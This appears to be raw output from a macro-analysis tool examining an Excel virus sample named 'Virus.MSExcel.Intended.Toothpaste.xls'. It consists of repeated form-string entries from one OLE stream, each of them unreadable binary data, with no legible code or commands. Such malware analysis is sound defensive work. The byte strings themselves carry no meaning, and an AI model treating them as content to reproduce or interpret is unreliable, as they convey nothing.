-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l޶�婽;�-��M� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������d�<�Gva��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i�w�N/x���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!1AQaq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���� ���0����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-U}F6'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8���b!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��$�IY��{�*(���I�	rΣo���r����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PL��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǆ&���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��`f��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x�\6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ב`l{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ץ����N#���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڢ�S�Du��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
/�OQ�.&2ՆRg�؞1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Q�����A�!w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̇�6��mHƪ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[:��7E.ޡa	u�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��P8�+��e�u(�MJ�4Wq!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&~��F��my�j��ҵAY;��U	�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k��9{�d�N͜�u�F�%$O�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����~�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4�¹�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�%Ó��
��p���uX<,�h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���'�0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<(���� �Z�'�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ӕ��(x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q�?5S��%U�%�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����2���J� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ї���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����:s�r�sT��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�K@�S�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��x�r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>�/��*�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,(�����@9�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���UJ�Cߘ�ퟃ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b���h�5`_�D<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
jQ��׈��-c��N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Jȗ_q�p"���DT��-l����H�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�a
d�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�fx,�F�9��"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
� b�#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;h�ENܜ���Ӏ����c+�N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�x��꘿6�R�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��a�A�9�<�Oտ�ي;X�]
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�sO��2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ea#��x"��e�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u�Qz�m�Q�T�Z��ٞ0�y�3L��-�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%S�A��4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W0
�;�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�(X:e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ú:��Q����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��(��T	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.��y����.�á�U�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��r.V(AF�9�h��Y�V������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!��U0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ˍ�`t
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ZŇ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#p�%E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+�uMF<J
�~j�a�/4�f�U�bX�~J��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E�n�G�<@l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'�<aS��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�"d�P�,�%X�t�Y�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���{�6�<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y���L�*�r�v��|k��h�w�}��nؖ헽Dr�@2)W,)`	��.j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Qو�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T�G%z��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9���y�R���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\���g��#F�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!<zJ3q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bP\��g�6��Bo�;����)�OC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�-���b(�
R�nQ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���A���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�_p
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��jK�E��P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���6f{T��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^B&+3N�&0�d9��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x]E��� ?�āA��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e�R�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��˂&���w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K��K*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ݡ��*/v�=@T�l+|DS*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"��^'ԡX
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
F�r�V��@�Ɉ�i�d�	6�4�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�����C�@��
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pŵE�n=M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�[κ�.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$�\���֮Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ȳ̬��*p����	� U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s^���U;2:�{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)�m��l]c�\A�Sb���Ms�q� �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�|9eI��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����o�&�^�X{�hN�+K+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����r�[(�kQ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#Q)�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�,i+q`�	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���F�nS`#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T��6��0��6
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Dr��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�*������-h9e
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Æ��_,q���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�e���$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j&��
<�`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�߉o���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x����ҽV���͗�IL��q�8��2�;���A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���	b��r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ݓ�4)���b��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
